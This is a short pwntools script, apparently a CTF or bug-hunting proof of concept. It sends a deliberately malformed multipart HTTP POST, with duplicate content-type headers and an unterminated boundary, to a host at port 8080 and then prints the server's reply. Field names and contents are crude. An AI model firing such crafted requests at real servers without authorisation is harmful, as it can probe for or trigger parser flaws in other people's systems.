from pwn import *
import time
import sys
r = remote(sys.argv[1],8080)
rn = b"\r\n"

payload=b''
payload +=b"--siiit"+rn
payload +=b"Content-Disposition: form-data; name=\"shit1\"; filename=\"shit.file\";"+rn
payload+= rn
payload+=b"HelloWorld!"+rn
payload +=b"--siiit"+rn
payload +=b"Content-Disposition: form-data;  name=\"shit2\"; filename=\"shit2.file\""+rn
payload+= rn
payload+=b"FuckkWorld!"+rn
payload +=b"--siiit"+rn

data = b"POST / HTTP/1.1\r\nHost:HelloWorld:8080\r\n"
data +=b"content-type:multipart/form-data"+rn
data +=b"content-type:boundary=siiit"+rn
data +=b"content-length:"+str(len(payload)).encode()+rn
data +=b"cookie:"+b'a'*0x1+rn
data +=rn
data +=payload


r.send(data)
sleep(20)
try:
    dat=r.recvn(1024)
    print(dat)
    r.close()
except:
    r.close()
